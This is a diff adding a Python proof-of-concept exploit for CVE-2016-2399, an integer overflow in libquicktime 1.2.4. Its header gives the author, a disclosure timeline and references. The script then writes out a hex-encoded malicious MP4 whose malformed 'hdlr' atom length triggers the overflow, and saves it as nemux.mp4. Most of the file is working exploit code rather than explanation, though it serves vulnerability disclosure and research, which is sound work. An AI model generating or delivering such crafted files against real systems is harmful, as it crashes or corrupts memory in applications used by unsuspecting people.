@@ -1,0 +1,105 @@
+#!/usr/bin/env python
+#
+###
+# - 7 February 2016 -
+# My last bug hunting session (*for fun and no-profit*) 
+# has been dedicated to libquicktime
+###
+# 
+# Author: Marco Romano - @nemux_ http://www.nemux.org
+# libquicktime 1.2.4 Integer Overflow
+#
+# Product Page: http://libquicktime.sourceforge.net/
+# Description: 'hdlr', 'stsd', 'ftab' MP4 Atoms Integer Overflow
+# Affected products: All products using libquicktime version <= 1.2.4
+#
+# CVE-ID: CVE-2016-2399 
+#
+# Disclosure part: http://www.nemux.org
+#
+########
+####### Timeline
+#
+# 07 Feb 2016 Bug discovered
+# 17 Feb 2016 Mitre.org contacted
+# 17 Feb 2016 Disclosed to the project's maintainer
+# 23 Feb 2016 No response from the maintainer
+# 23 Feb 2016 Publicly disclosed 
+#
+########
+####### References
+#
+# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2399
+# http://libquicktime.sourceforge.net/
+# http://www.linuxfromscratch.org/blfs/view/svn/multimedia/libquicktime.html 
+# https://en.wikipedia.org/wiki/QuickTime\_File\_Format
+#
+#######
+#
+# DISCLAIMER: It's just a PoC... it will crash something
+#
+#### 
+import sys
+import struct
+import binascii
+
+"""
+There needs to be an mp4 file with these nested atoms to trigger the bug:
+moov -> trak -> mdia -> hdlr
+"""
+hax0r_mp4 = ("0000001C667479704141414100000300336770346D70343133677036000000086D646174000001B1" 
+             "6D6F6F76"               #### moov atom
+             "0000006C6D76686400000000CC1E6D6ECC1E6D6E000003E80000030200010000010000000000000000000000"
+             "000100000000000000000000000000000001000000000000000000000000000040000000000000000000000000000000" 
+             "00000000000000000000000000000003000000FD756474610000001263707274000000000000FEFF0000000000126175"
+             "7468000000000000FEFF0000000000127469746C000000000000FEFF00000000001264736370000000000000FEFF0000"
+             "0000001270657266000000000000FEFF000000000012676E7265000000000000FEFF00000000001A72746E6700000000" 
+             "00000000000000000000FEFF000000000018636C7366000000000000000000000000FEFF00000000000F6B7977640000" 
+             "000055C400000000276C6F6369000000000000FEFF000000000000000000000000000000FEFF0000FEFF0000000000FF" 
+             "616C626D000000000000FEFF0000010000000E79727263000000000000000002E4"
+             "7472616B"               #### trak atom
+             "0000005C746B686400000001CC1E6D6ECC1E6D6E00000001000000000000030000000000000000000000000001000000"
+             "000100000000000000000000000000000001000000000000000000000000000040000000000000000000000000000040"
+             "6D646961"               #### mdia atom
+             "000000206D64686400000000CC1E6D6ECC1E6D6E00003E800000300000000000000000"
+             "4E"                     #### hdlr atom length
+             "68646C72"               #### hdlr atom
+             "0000000000"
+             "4141414141414141"       #### our airstrip :)
+             "0000000000000000000000" 
+             "EC"                     #### 236 > 127 <-- overflow here and a change in signedness too
+             "616161000000FF736F756E000000000000000000000000536F756E6448616E646C6572000000012B6D696E6600000010")
+
+hax0r_mp4 = bytearray(binascii.unhexlify(hax0r_mp4))
+
+def createPoC():
+    try:
+        with open("./nemux.mp4","wb") as output:
+            output.write(hax0r_mp4)
+        print "[*] The PoC is done!"
+    except Exception,e: 
+        print str(e)
+        print "[*] mmmm!"
+
+def usage():
+    print "\nUsage? Run it -> " + sys.argv[0]
+    print "this poc creates an mp4 file named nemux.mp4"
+    print "--------------------------------------------"
+    print "This dummy help? " + sys.argv[0] + " help\n" 
+    sys.exit()
+
+if __name__ == "__main__":
+    try:
+        if len(sys.argv) == 2:
+            usage()
+        else:
+            print "\nlibquicktime <= 1.2.4 Integer Overflow CVE-2016-2399\n"
+            print "Author: Marco Romano - @nemux_ - http://www.nemux.org\n\n";
+            createPoC();
+    except Exception,e: 
+        print str(e)
+        print "Ok... Something went wrong..."
+        sys.exit()
+
+
+
